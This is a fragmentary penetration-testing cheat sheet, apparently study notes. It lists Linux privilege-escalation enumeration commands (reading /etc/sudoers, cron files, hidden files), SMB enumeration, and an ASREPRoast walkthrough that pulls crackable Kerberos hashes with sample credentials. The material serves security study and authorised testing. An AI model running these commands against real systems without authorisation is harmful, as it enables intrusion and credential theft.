
hostname
id
w
lastlog |grep -v "Never" : Users that have previously logged onto the system
-> To test

grep -v -e '^$' /etc/sudoers |grep -v "#"

echo '' | sudo -S -l -k

ls -ahl /root
ls -ahl /home
find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; :Hidden Files

grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print  $2}': is root permitted to login via ssh

find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {}

ls -la /var/spool/cron/crontabs
ls -la /etc/anacrontab; cat /etc/anacrontab
ls -la /var/spool/anacron

##### Temp:


-> docker0


NOPASSWD: specifies that no password will be asked while executing the file
SETENV


--- 

### Discovery

1. Check the source to potentiolly find 
   - If searching there are parameter (e.g. ?= try LFI)
   - Search for comment
   - Search for disabled functionnality
   - Search for the copyright -> find how old it is
   - Search for php 
     - May need to test https://domain/*index.php*




zgrep "authen" access.log* | grep -v 'gobuster\|Fuzz Faster U Fool\|Nikto\|Nmap Scripting Engine'
zgrep "pass" access.log* | grep -v 'gobuster\|Fuzz Faster U Fool\|Nikto\|Nmap Scripting Engine'



### SMB Enumeration

[Enum4linux](https://github.com/CiscoCXSecurity/enum4linux) is a tool for enumerating information from Windows and Samba systems.

```bash
smbclient -L //$ip # Perform SMB Finger Printing
nmap -sU --script nbstat.nse -p 137 IP # Attempts to retrieve the target's NetBIOS names and MAC address.
enum4linux -a IP # Perform all simple enumeration
/opt/impacket/examples/lookupsid.py USER:PASSWORD@victim.com
```

https://github.com/joker2a/OSCP#enumeration


For more information about that technique refer to [T1087 - Account Discovery](https://attack.mitre.org/techniques/T1087/)

### File Shares Enumeration

#### ASREPRoast

The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).

That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

```powershell
Get-DomainUser -PreauthNotRequired -verbose # List vuln users using
```

```bash
# Try all the usernames in usernames.txt
python GetNPUsers.py *domainip*/ -usersfile *usernames.txt* -format hashcat -outputfile hashes.asreproast
# Use domain creds to extract targets and target them
python GetNPUsers.py *domainip*/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

mode: 18200

For more information about that technique refer to [T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)

